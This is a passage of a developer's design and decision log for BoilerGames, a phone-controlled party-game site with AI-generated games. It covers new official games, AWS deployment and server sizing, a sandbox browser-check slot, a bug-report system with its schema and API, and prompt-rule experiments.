files stay as the fallback and for a new game's first attempt. Worth watching in real use:
how often edits fail to apply (the admin page shows each attempt's mode and problems).

## 24. Stowaways: a hidden-role game (official) (decided and built 2026-10-16)

**Why:** §22's "bluffing, secrets, hidden roles" had no game yet. The user asked for a
hand-written official one inspired by Jackbox Party Pack 6's _Push The Button_ (its mechanics,
not its name, text or art). It is the second official game after Bumper Blobs, and the first
that keeps secrets on the phones.

**The design** (`generator/spec/designs/stowaways.md`, reviewed by the user first): 4–10
players; 1 alien at 4–5, 2 at 6–8, 3 at 9–10. A captain picks a test (Write, Draw, Opinion) and
2–4 players; aliens get a close but different prompt. The answers go up on the big screen and
the room argues. Anyone can hit the button once per game to accuse as many players as there are
aliens; everyone else votes, and only a unanimous Eject ejects them. One ejection ends the game:
the humans win only if exactly the aliens went out. Clock: 3 min + 1 min per player, paused
during the button. The user's decisions on the design:
- **Hacks frame, they don't convert** (as in the original): an alien's hack gives a human the
  aliens' prompt for the test being picked, if the captain picks them (or an alien the
  humans' one, as cover). Two per alien, from the second test; a hack that isn't used (the
  player wasn't picked, or the pick was abandoned) comes back. Conversion would make "who's an
  alien" a moving target.
- **Two additions of ours:** _last call_ (at 0:00, 30 s in which everyone gets one more push)
  and _public votes_ (the screen names who voted Keep).
- **Three tests in v1** (Write, Draw, Opinion); Deliberation (aliens see only the options) later.
- The design is ~1,300 words, over DESIGN.md's ~600: it's hand-written, not an AI example.

**How it keeps secrets:**
- The big screen never shows a role or the prompt during a test (it would tell the aliens the
  humans' prompt); only the humans' prompt, at the reveal.
- Each phone gets its own `setState`, never `'all'`. The role card is covered until tapped.
- Everyone taps the crew grid to mark suspects (private marks), at any time. **Every pick
  starts with a clean grid** on every phone (decided with the user: so for an alien, what's
  marked during a pick is exactly what's hacked; a human's marks last one round). For an alien
  during a pick, a mark is a hack (unmarking takes it back); the hacks, hacks left and the
  other aliens appear only on the covered role card. So every phone looks and reacts the same
  (a review found an alien's taps did nothing outside the pick, which gave them away; fixed,
  and an e2e test compares a covered alien phone with a human's).
- The big screen redraws only when something public changed, so a note or a hack doesn't
  make it flicker. Phones make no sound; the big screen plays sounds only for public moments.

**Built:** `server/src/games/stowaways/game.html` (~58 KB: HTML and CSS for the station's
helmets, cards and airlock, a canvas for the blueprint grid and scan line, ~60 prompt pairs),
in `OFFICIAL_GAMES`, with catalogue shots from `check-game --players 10` (PASSED). One
plain-JSON object is saved after every change; deadlines are server times, so a big-screen
reload carries on. Tests: the static check's list of official games, and
`e2e/tests/stowaways.spec.js` (four phones: roles → a writing test → the reveal → the button →
a unanimous vote → the humans win; a big-screen reload; a drawing test, then a hack that gives
a human the aliens' prompt).

**Small changes made while building:** you can't accuse yourself; the voters show as small
chips (not helmets) to leave room for the airlock; a font size on the big screen that follows the
frame's height too, so every phase fits a short window as well as a TV.

**Next:** play-tests with real groups (balance: test sizes, hack count, clock length), then
Deliberation as a fourth test.

---

## 25. One look for the whole site, from /create (built 2026-10-16)

The guided /create (§19) set a look; the other pages now share it, so the site feels like one place:

- **Titles and intros.** Every page's title is /create's: big, heavy and tight (`.page > h1`, or `.page-title`), with a larger muted intro line under it. One CSS rule covers all pages, instead of a class per page.
- **Gold is the one bold color.** Boilermaker gold (`--gold`, now in the theme block) marks: the /create track, the current page in the nav (a gold underline), the home page's "How it works" (a 3-step gold track, a column on phones), and the token.
- **The token.** /create's gold game piece with a first letter (`components/Token.jsx`) now also stands in for a game with no screenshot (instead of a rainbow gradient tile), and for a person on their profile.
- **The room code** on the big screen: each letter on its own gold tile, like game pieces, and readable from across the room. The "Join at" / "Room code" labels are no longer all caps.
- **Keyboard focus** shows a strong outline on every page, not just /create.

No behavior changed: same pages, same words (except "How it works" laid out as a track), and all browser tests pass.

## 26. Five more default games, one per genre (built 2026-10-17)

**Why:** §22 named the genres that fit. Each now has an official game, so players have
something good to play on day one, and people making games see what's possible. Every
game shows off a different part of the platform. Each one's rules, screens and reasons are in
`generator/spec/designs/<id>.md`.

| Game | Genre | Players, length | What it shows off |
|---|---|---|---|
| **Punchline** | writing and voting (Quiplash-style) | 3–8, 5–12 min | different prompts per phone (`sendTo`), `textInput`, anonymous votes, 152 built-in prompts |
| **Doodle Drift** | drawing telephone | 4–8, 6–14 min | `drawPad`, drawings passed phone to phone, shrunk to ~2–3 KB so a whole game fits in `party.save` |
| **Ballpark** | estimation (Wits & Wagers-style) | 2–10, 6–10 min | a number keypad, betting with odds, a speed tie-break with `party.now` |
| **Claim Jumpers** | simultaneous-move board game | 2–6, 4–7 min | everyone moves at once (nobody waits), a board readable by colour *and* shape |
| **Comet Crew** | co-op action | 2–8, ~4.5 min | one shared ship, a station per phone (`joystick`, `gamepad`), a team score, forgiving of phone lag |

**How they were built:** five agents in parallel, each in its own git worktree, on its own test
ports (`E2E_SERVER_PORT` / `E2E_CLIENT_PORT`), then reviewed and merged one at a time. Each has
a design, its game file and catalogue pictures, and a browser test that plays it with phones.

**Small platform fix they turned up:** the lobby's "last game" line. A co-op game gives everyone
the same score, so the lobby now says "Everyone shares the win!" instead of listing a tie of
everyone. A game that breaks ties itself (Ballpark, by speed) leaves `scores` out of `party.end`,
so the lobby names its winner.

**Not yet known (needs real play):** Comet Crew's difficulty in waves 5–6; whether Claim
Jumpers' 15 turns feel short at 2 players; Doodle Drift and Punchline timers with real groups.

## 27. Deploying (M8): AWS EC2, generation on the same server (decided 2026-10-17)

**Decisions:**
- **Hosting (D17, updated):** one **AWS EC2** instance on the free tier, instead of an unnamed VPS.
  Still one server with Caddy, as D17 decided.
- **Q10 (where generation runs):** on **that same server**, with Docker + OpenShell as on the dev
  PC. It needs ~4 GB of memory, so the instance must have at least that. Everyone's jobs run on their own GenAI
  Studio key (§15), so the server pays for nothing but the machine.
- **Domain:** the user's own domain, with an A record pointing to the instance's Elastic IP.

**What was built:**
- **The server serves the built website itself:** `client/dist`, with `index.html` for any page
  address. One process and one port, no Vite in production.
- **`deploy/`:** a Caddyfile (HTTPS + `wss://`), the systemd service, the settings file
  (`/etc/boilergames.env`), a nightly SQLite backup (14 days kept, with the key secret), and
  `deploy/README.md`, the step-by-step guide from an empty AWS account to the site on a
  phone on mobile data.

**Risks:**
- **Free-tier limits:** check what the free tier covers before launching, and how long. It has
  changed over time; the EC2 launch screen marks eligible types.
- **Backups stay on the same machine** unless downloaded; a lost instance loses them. Copying
  them to S3 is a later step.

## 28. Server size and making several games at once (decided 2026-10-17)

**Measured (one real generation on the dev PC, sampled every few seconds):** Docker +
OpenShell idle use ~210 MB. A job adds ~70 MB while it waits for the AI (about 90% of
its time) and peaks at ~450 MB during its ~20 s browser playtest. A whole server (Ubuntu,
Docker, OpenShell, Node, one job) needs ~1.1 GB at its worst. The 4 GB guess in §27 was far
too high.

**Server:** Lightsail 2 GB ($12/month with its IP address, disk and data), with a 2 GB swap
file as a safety net. The $100 free-plan credits cover it until they expire (2027-04-17).
EC2 options cost more for the same size (a separate charge for the IP address and disk) and
don't scale down by themselves; scaling out needs rooms and the database moved off the one
server first.

**Several games at once (built):** a job used to run only when no other job was running,
a leftover from when only admins generated. Now up to `GENERATION_MAX_RUNNING` (default 2)
run at once; up to 4 more wait in line. One job per person stays (§15). The limit is small
because two browser checks at the same moment use ~900 MB and both CPUs, and the checker
measures timing, so a starved CPU could fail a good game.

**The shared browser slot (built the same day, at the user's request).** Jobs talk to the AI
in parallel and take turns only for the browser check, so the expensive part runs one at a
time however many games are being made. `GENERATION_MAX_RUNNING` rose to 4 (default), and
`GENERATION_BROWSER_CHECKS` (default 1) sets how many checks run at once.

- **The channel:** the sandbox can't reach the server, so the job uses the pipes it already
  has. The server sends the job as the first line of stdin, with a random token, and keeps
  stdin open. Before each check the job prints `BROWSER? <token>` on stderr and waits; the
  server answers `BROWSER! <token>` on stdin when the slot is free; afterwards the job prints
  `BROWSER done <token>` (also if the check crashed). Verified first that `openshell sandbox
  exec` passes stdin through live.
- **Safety rules:** the slot is freed when a job ends for any reason; after 2 minutes of
  holding it the server stops the job ("the browser check took longer than…") and the next
  goes; lines without the job's own token, or out of order, are ignored. The token never
  reaches the game under test, and the game's output never reaches stderr (every progress
  line is one `STEP` line, line breaks removed), so a game can't fake the messages.
- **Where:** `generator/src/browserGate.js` (the job's side), `server/src/generation/browserSlot.js`
  (the slot), `slotGate` in `sandbox.js` (the conversation). Without a slot (the
  `npm run generate` script) jobs check whenever they like, as before.

## 29. The server: EC2 t3.small, then Lightsail when the credits end (built 2026-10-17)

**What happened:** Lightsail refused the $12 2 GB plan ("your account can not create an
instance using this Lightsail plan size"): free-plan projects only get the small Lightsail
plans. EC2's free-plan types include `t3.small` (2 GB, 2 vCPUs, x86), the size §28 measured
for, so that's the server.

**The money:** the free plan is credits, not free usage: $100 at sign-up plus $20 for each of
5 starter activities ($200 in all once done; launching EC2 and setting a budget are two). Any
supported service spends them. The server costs ~$21/month (t3.small $15.18, 30 GB disk $2.40,
the IP address $3.65), so the credits cover it until the free plan ends (2027-04-17).
**Then:** move to a cheaper Lightsail server (2 GB at $12/month, on the paid plan) and pay
for it; the deploy steps are the same apart from step 1.

**What was created (us-east-2, all tagged `project=boilergames`):**
- instance `boilergames` (`t3.small`, Ubuntu 24.04 from Canonical's official image, 30 GB
  encrypted gp3 disk, IMDSv2 required, **CPU credits "standard"** so bursts can never add
  charges, only slow down);
- Elastic IP **18.222.40.29**; security group `boilergames-web`: 22 (SSH, key-only), 80, 443;
- the user's own SSH public key, imported (the private key never left their machine);
- budget `boilergames-monthly`: $25/month.

**Set up (2026-10-17), following `deploy/README.md` over SSH:** swap, Node 24, the code (via a
read-only GitHub deploy key: the repo is private), the systemd service (generation off, then
on), Caddy (a Let's Encrypt certificate on the first try), Docker, OpenShell 0.1.3 (pinned to
the dev PC's version), the generator image, nightly backups. Checked: HTTPS and `wss://` from
outside, port 3000 closed, GenAI Studio reachable from AWS (HTTP 401 without a key), the
checker passing a game on the server, and everything back by itself after a reboot.
Lessons now in the guide: OpenShell's gateway is a user service (needs lingering and a
restart of the user's service manager after joining the docker group, else "no compute
driver"), and the CLI must be registered with `openshell gateway add --local`.

## 30. Updating the live site with almost no downtime (built 2026-10-17)

**Problem:** the first way to update (`git pull`, install, build, restart, all in the live
folder) changed the files under the running server, so pages loaded mid-build could break.
A broken version went live before anyone knew, and the restart ended any game being played
(rooms live in memory, §9).

**Decision:** one script, `deploy/update.sh` (steps in `deploy/README.md`):
- **Build off to the side** (`~/boilergames-next`, a git worktree), then **try** it on port
  3001 with a copy of the database. A bad version stops there; the site is never touched.
- **Wait until nobody is playing** or making a game (default up to 30 min, `--now` to skip).
  The server answers `GET /api/status` (`{rooms, playing, connections, generating}`) only to
  itself: through Caddy a visitor's address is never 127.0.0.1 (`TRUST_PROXY=loopback`).
- **Switch by renaming** the built `node_modules` and `client/dist` into place (instant), and
  restart. Caddy keeps retrying for up to 10 s (`lb_try_duration`), so the ~2 s restart is a
  slow page, not a 502. The new build keeps the last week's asset files for tabs left open.
- **Check, else roll back** the code, packages, website and generator image (`:previous`).

**Not done, on purpose:** no two servers side by side (true zero downtime). Rooms are in one
process's memory, so a second server couldn't take them over anyway; waiting for an empty
server gets the same result for players with far less machinery. No automatic deploys from
GitHub yet: they'd need GitHub to hold a login to the server.

Rehearsed on the dev PC with stand-ins for sudo/systemctl/docker: the first update (from a
version without `/api/status`), waiting out an open room, and a rollback of a version that
only failed once live. Also added `.dockerignore`: the generator's build context went from the
whole repo (with `node_modules` and `server/data`) to 28 kB.

## 31. Demo phase and bug reports (planned and built 2026-10-17)

**Why:** the first real test on the live site found bugs in the site and in the games. The site
should say plainly that it's a demo, and make reporting a problem take seconds, for the site as
a whole and for each game, with the reports people agree on rising to the top.

### 31a. "(demo)" everywhere (except in a game)

- **A corner badge:** a small gold `(demo)` pill, fixed to the **bottom-left** corner of every
  page. It's a link to the report form (31c), so it's useful as well as a label.
- **Hidden while a game is on screen.** `GameFrame.jsx` already puts `in-game` on `<body>` for
  the big screen and the phones, so one CSS rule hides it. It shows in lobbies, which aren't
  the game yet.
- **The home page:** the big title becomes `BoilerGames (demo)`, with "(demo)" smaller and in
  gold. The tagline gets a quip, e.g. *"Party games on one big screen, played from everyone's
  phones. Fair warning: it's a demo, so things will break. Tell me when they do: I want your
  input on everything."*

### 31b. Bug reports on each game's page

A **"Bug reports"** section under "About this game", built like a comment section:

- **Post:** a text box (10–1000 characters) and "Report". You need an account, like voting on
  games: that keeps spam and drive-by abuse down, and gives every report a name.
- **Each report shows:** the text (plain text, as everything typed on the site is), who wrote
  it, how long ago, and the **device it came from** ("iPhone · Safari", worked out from the
  browser when posting). Many game bugs only happen on one kind of phone.
- **Votes, karma-style:** ▲ and ▼, with **one number shown: the total** (ups minus downs), which
  can go negative. One vote per account per report; press again to take it back; you can't
  vote on your own report. Reports are **ordered by total, then newest first**. So the issues
  people agree on rise, and unhelpful ones sink.
- **Sunk reports fold away:** at a total of **−5 or less**, a report collapses to "Hidden: voted
  down (show)". That's the filter for spam and jokes, without deleting anything.
- **Fixed:** the game's creator or an admin can mark a report **fixed**. It then moves to a
  folded "Fixed (n)" list at the bottom, so the open list stays a to-do list.
- **Deleting:** the author or an admin can delete a report.
- **Long lists:** the top 20, then "Show more".
- Reports exist only for games the viewer can see. Deleting a generated game deletes its
  reports.

### 31c. Site-wide reports: the footer and the form

- **The footer:** *"BoilerGames is still in an early testing phase and I'd love your feedback!
  [Report an issue](/report)"*. It's on every ordinary page. It's **not** on the room screens
  (`/host`, `/join`: they're shown to a whole room, and the badge is still there), or on
  `/report` itself. It's never shown during a game.
- **The link remembers where you were** (`/report?from=/games/punchline`), so the report says
  which page it's about without asking.
- **The form (`/report`):**
  - what kind: **Something's broken** / **An idea** / **Something else**;
  - what happened (10–2000 characters);
  - the page and device, filled in by themselves and shown so people know what's sent.
  - If `from` is a game page, the form suggests: *"About Punchline? Reporting it on its page
    lets others vote on it."* Both stay possible.
- **Who may send it:** **anyone, logged in or not**, since lots of testers won't have an account.
  Logged in, the report carries your username. Spam guards: at most 5 reports per address per
  10 minutes (the same limiter as sign-up), and a hidden "honeypot" field that only bots fill.
- **After sending:** *"Thanks! Your feedback is very, very, very much appreciated!"*, then
  *"Redirecting back to the main site in 3…"*, counting down 3, 2, 1, and then going to `/`.
  A "Go now" link is there for the impatient.
- **Reading them:** `/admin` gets a **Reports** tab. It lists site reports newest first, with
  their kind, page, device and author. "Done" marks one dealt with; "Delete" removes it. It
  also lists the newest game reports across all games, with links to their pages.

### Data (migration 10)

```sql
CREATE TABLE site_reports (           -- from /report
  id INTEGER PRIMARY KEY, user_id INTEGER REFERENCES users(id) ON DELETE SET NULL,
  kind TEXT NOT NULL CHECK (kind IN ('bug', 'idea', 'other')),
  page TEXT, body TEXT NOT NULL, device TEXT,
  done_at INTEGER, created_at INTEGER NOT NULL);
CREATE TABLE game_reports (           -- on a game's page
  id INTEGER PRIMARY KEY, game_id TEXT NOT NULL,   -- official or "g-…": no foreign key, like game_pages
  user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  body TEXT NOT NULL, device TEXT,
  fixed_at INTEGER, created_at INTEGER NOT NULL);
CREATE TABLE game_report_votes (      -- like game_votes: +1 / -1, taking it back deletes the row
  report_id INTEGER NOT NULL REFERENCES game_reports(id) ON DELETE CASCADE,
  user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  value INTEGER NOT NULL CHECK (value IN (-1, 1)),
  PRIMARY KEY (report_id, user_id));
```

The total is worked out when the list is read (`SUM(value)`), not stored, so it can never drift.
At our size that's instant.

### API

| | |
|---|---|
| `GET /api/games/:id/reports` | the list: text, author, device, time, total, my vote, what I may do |
| `POST /api/games/:id/reports` | post one (logged in; ≤ 10 per account per hour) |
| `PUT /api/game-reports/:rid/vote` | `{ value: 1 \| -1 \| 0 }` → the new total |
| `POST /api/game-reports/:rid/fixed` | `{ fixed: true \| false }` (the game's creator or an admin) |
| `DELETE /api/game-reports/:rid` | the author or an admin |
| `POST /api/reports` | the site form (anyone; rate-limited by address) |
| `GET /api/admin/reports`, `POST …/:id/done`, `DELETE …/:id` | the admin tab |

### Build order (each its own commits)

1. The demo badge and the home page (client only).
2. Migration 10 and the site form: the footer, `/report` with its countdown, `POST
   /api/reports`, and the admin tab.
3. Game reports: the API, then the section on the game page with votes, folding and fixed.
4. Tests:
   - unit tests for ordering, the vote rules and who may do what;
   - integration tests for every route, including the limits and the honeypot;
   - e2e tests: the badge is gone during a game; footer → form → thanks → back to `/` after
     3 s; two accounts voting a report above another one.
5. Deploy with `deploy/update.sh` (migration 10 runs on the trial copy first, §30).

**As built:**
- The rules for game reports live in `server/src/games/gameReports.js`. They reuse the
  catalogue's own answers: who can see a game, and who counts as its creator (`canEdit`).
- A report folds the moment its total reaches −5, even on the screen of the person whose ▼
  did it.
- Pages without the footer still leave room at the bottom, so the badge never covers a button.
- While testing, two Punchline e2e tests turned out to have a race of their own: they typed the
  second answer before the second prompt was on screen. They now wait for it (the game was fine).

## 32. Secrets in AI games, the context window, and a size-limit experiment (2026-10-17)

### Secrets on the big screen

**Problem:** in AI-made games where players get a secret (a role, a word), Qwen often showed
it on the big screen. The contract never said the TV is public. It called the big screen
"the referee" that "holds the whole game", and its role is named `host`, which reads as a
game master who may know everything. The design template never asked what's secret, and the
checker has no rule a leak would break.

**Decided and built:**
- **The guide** (`GAME_SPEC.md`) calls the big screen "the referee, in plain sight", says
  everyone in the room can see it, and says "host" is the shared screen, not a person.
- **Rule 10, "Secrets stay on their own phone":**
  - no secret on the big screen, not even as a hint (a colour, an icon, the order of a list,
    a caption);
  - secrets only via `setState(player)` or `sendTo(player)`, never `'all'`;
  - reveals happen on purpose;
  - no phone sound that gives a secret away.
- **A Secrets heading in the design template:** each secret, who knows it, and when the big
  screen reveals it, or `none`. A design without it is sent back, like any missing heading.
  All 7 official designs now have one.

**Not done, on purpose:**
- **An automatic leak check:** secrets marked under one key in a phone's state, checked
  against the big screen's text during the playtest. Maybe later; it would bring its own
  problems.
- **Example games or snippets:** the AI copies them (§13n, §13o). Widget-level examples are
  added only when they're almost certainly useful and unlikely to make games look the same.

Also: the kit's `textInput` got `lockOnSubmit`, used by Punchline. On a slow phone, an
answer typed into the first prompt's box before the second prompt arrived was dropped.

### The context window

qwen3.8:27b has 65,536 tokens per call, for everything together: the prompt, the game, its
thinking and its reply. Code is ~2.8 bytes per token. The numbers are in `prompt.js`.

**Changes and fixes** use edit mode (§23): the game is in the call once, and the reply is
only the edits, so the AI can change any game up to 100 KB. **A first build** has to write
the whole file in one reply: ~6K tokens of prompt, up to ~24K of thinking, and the game. The
games come out at 12–35 KB (5–13K tokens), far below the 100 KB limit.

**Ways to use it better later:**
- **Measure** thinking vs. writing per build; every attempt already records its tokens.
- **Budget the thinking:** it's the largest cost, and the design step has already planned.
- **Build in passes:** a core game first, then features added as edits. This is the way
  past the "whole file in one reply" ceiling.
- **Send only what an edit needs:** risky, since the model loses sight of the rest.
- **A model with a bigger window,** if GenAI Studio adds one.

### Experiment: does "At most 100 KB" in the build prompt change the games?

The idea: the line may nudge the model toward terse games, and we don't need it, since the
check after the build enforces the limit anyway.
- **The switch:** the `sizeLimit: false` build option leaves both mentions out of the prompt
  (the rulebook's line and the build instruction's last sentence).
- **The runner:** `npm run compare-builds` builds one design several times per variant,
  taking turns.
- **The test:** a Drawful Animate-style idea, one design, 4 builds with the limit and 4
  without. Results go in `generator/out/size-limit/summary.md`, plus playing them.

**Results (2026-10-18):**

| | Passed | Avg size | Avg first reply | Avg time |
|---|---|---|---|---|
| With the limit | 4 of 4 | 30.7 KB | 51.5K tokens | 17 min |
| Without | 4 of 4 | 34.6 KB | 36.2K tokens | 19.5 min |

- **Every build passed** on both sides. Without the line, games came out ~13% bigger, and the
  two biggest (37.6 and 37.8 KB) were both from that side.
- **First replies were much longer than expected:** 19–57K tokens, against the ~24K of
  thinking guessed above. Mostly thinking, since the games are only ~10–13K tokens. A 57K
  reply plus a ~6K prompt is close to the 65K window. That makes "budget the thinking" the
  first thing to look at.
- **No secrets leaked:** the design had a Secrets section, and no build's big screen showed
  the prompt while someone drew.
- **Four builds a side is too few to call the size difference real.** Playing them decides
  whether bigger means better.

## 33. Being found: "boilergames" in search results (built 2026-10-17)

For a made-up name that matches the domain, ranking first is mostly Google knowing the site
exists and trusting it's the real one. So the work is setup, not content:

- **Fixed:** `/robots.txt` and `/sitemap.xml` were answered with the website's page (the
  server sends index.html for any address it doesn't know). Now they're real
  (`server/src/http/seoRoutes.js`):
  - robots.txt keeps crawlers out of private pages (admin, account, create, host, login,
    report) and points to the sitemap;
  - the sitemap lists home, /games, /kit and every public game. It's built per request, so
    new games join it by themselves.
- **In the page itself** (`client/index.html`, because link previews don't run
  JavaScript):
  - a description;
  - a title that says what the site is;
  - Open Graph tags with a 1200×630 card (`og-image.png`);
  - the site name as structured data (JSON-LD), so results can say "BoilerGames";
  - a favicon (the gold token with a B).
- **Soft 404s:** every address answers 200, and only the browser knows a page is missing.
  The not-found screens (no page, no such game, no such account) now add
  `<meta name="robots" content="noindex">`.
- **The owner's part:** Google Search Console (a Domain property, verified through
  Cloudflare's DNS), submit the sitemap and request indexing; Bing Webmaster Tools (imports
  from Search Console). And links from real places: LaunchPad's page, LinkedIn, r/Purdue,
  club Discords.

## 34. Dark only (decided and built 2026-10-17)

**Why:** BoilerGames is played on a TV in a living room, with phones held next to it. Light
mode made the phone screenshots and many screens look wrong, and keeping two themes meant
every game had to be designed and checked for both.

**What changed:**
- **The site:** one set of colours, the old dark ones, in `styles.css`. The setting is gone.
  It was the only setting, so the ⚙ button and its panel are gone too (they can come back
  with a second setting). So is the script in `index.html` that picked a theme before the
  first paint. `color-scheme` and `theme-color` say dark from the first paint.
- **Games:** the frame's base colours (`base.css`) are dark only, and the platform always
  tells games `theme: 'dark'`. Games written before this keep working: `party.theme` is
  `'dark'`, and a `'theme'` listener simply never fires.
- **The guide:**
  - no `theme` in `party.ready`, no `party.theme`, no `'theme'` event;
  - no "Both themes" advice ("the colour variables match the platform");
  - nothing about looking right in both themes.
  - Two official designs lost their theme remarks.
- **The checker** plays games in dark, so new screenshots are dark. Bumper Blobs' and Comet
  Crew's phone pictures (the light ones) were retaken. The other official games paint their
  own scenes.
- **Not retaken:** screenshots of AI games built before this. They change when a new version
  of the game is built.

## 35. Experiment: does the 5–15 minute rule help? (2026-10-18)

The rulebook says a game lasts "about 5–15 minutes unless the idea asks for something else",
and the design guide's Length section says "Aim for 5–15 minutes… change the design
instead of just reporting it." The worry: it's fluff that makes the model pad games with
extra rounds to hit a number, instead of designing what fits the idea.
- **The switch:** the `lengthRule: false` job option (design and build steps). It drops the
  5–15 minutes from both files. The rulebook keeps "each round takes at least about 20 s"
  and "don't make a game longer with waiting"; the design still works out its length.
- **Why every build gets its own design:** the rule mostly shapes the *design* (how many
  rounds), so one shared design would hide its effect. `compare-builds --fresh-design`
  designs first, per build, with that side's options.
- **The test:** the same Drawful Animate-style idea as §32, 4 builds with the rule and 4
  without. The size line stays in on both sides, so only one thing changes.
- **What to look at:** the `minutes` each game claims, its rounds, and playing them.
  Results go in `generator/out/length-rule/summary.md`.

**Results (2026-10-18):**

| | Passed | Avg size | Minutes the games claim |
|---|---|---|---|
| With the rule | 3 of 4 | 25.9 KB | 5–12, 3–9, 6–9, 7–11 |
| Without | 2 of 4 | 32.1 KB | 6–9, 7–10, 4–15, 5–12 |

- **The length didn't change.** Without the rule, every design still worked out its rounds
  and landed at about 4–15 minutes. The model already knows how long a party game runs.
- **The failures weren't about length:** a syntax error, and names used before they were
  defined. With a fresh design per build, the spread between builds is wide, so 2 vs 3
  passes is noise.
- **Without the rule, games came out ~25% bigger** (32 vs 26 KB), like §32's no-limit side.
  Four builds a side is too few to call it real.
- **So the rule is fluff:** it costs prompt space and changes nothing measurable.

## 36. Claim Jumpers rework, Stowaways refresh, and the timer bar (2026-10-18)

From playing the official games: Doodle Drift, Punchline, Ballpark and Comet Crew are good.
Claim Jumpers is bad, worst with two players. Stowaways is fine, but its "marks" confuse and
seem to do nothing, and tapping a mark resets the timer bar.

**a. The timer bar (a kit fix, for every game).** `party.ui.timer` took "the time left when
I was made" as its 100%. A game that rebuilds its screen (Stowaways on every mark) makes a
new timer, which started full again. Now the kit remembers the full length it first saw
for each end time, so a rebuilt timer carries on where the old one was. AI games get the
fix without changes. Stowaways also keeps its timer out of the part it rebuilds.

**b. Stowaways: marks become public suspicions.**
- **Suspect (everyone):** tap one crewmate at a time. The big screen shows how many suspect
  each player (🔍 2 under the capsule), never who. The captain sees the counts while choosing.
  They clear at each new test.
- **Hacks move onto the aliens' covered role card** ("Hack a crewmate"), a separate,
  clearly named action. Everyone is tapping to suspect anyway, so an alien tapping isn't a
  tell. Before, an alien's mark was secretly a hack, and a human's mark did nothing.

**c. Claim Jumpers, reworked: blind claim bids** (it keeps the name, theme and the reveal).
- **Why the old one failed:** on a 6 × 6 board two players mostly expand into empty land and
  never meet, clashes almost never happen, and the best move is nearly always obvious.
- **A round:** players + 1 claims on the map, each worth 1–5 nuggets; one is a **?** (0–8,
  shown at the reveal). Each phone spreads **5 prospectors** over the claims and locks in (25 s).
- **The reveal, a claim at a time:** the biggest crew takes the gold; **a tie for biggest is a
  claim jump: nobody gets it.**
- **Dynamite, once per game:** put it on a claim and nobody gets it.
- **Catch-up:** last place gets a 6th prospector next round.
- **7 rounds;** the last is the **Mother Lode** (double values). Most gold wins.
- **Why it works with two:** dividing a fixed crew over prizes ("Colonel Blotto") is a classic
  two-player mind game, and it scales to 6. Every round is a choice: spread or pile up.

## Verification (how to confirm the plan worked once built)

- `npm test` (root) → runs `node --test server/test`, all unit and integration tests green.
- Manual run at each milestone, following the "You can run / review" column in §8, with a laptop and 2+ phones on the same network (`vite --host` exposes the dev server on the LAN).
- Robustness smoke test: from a Node REPL, open a `ws` client and send garbage, binary data, a 5 KB frame, and 100 messages in a burst → the server stays up and other clients are unaffected.
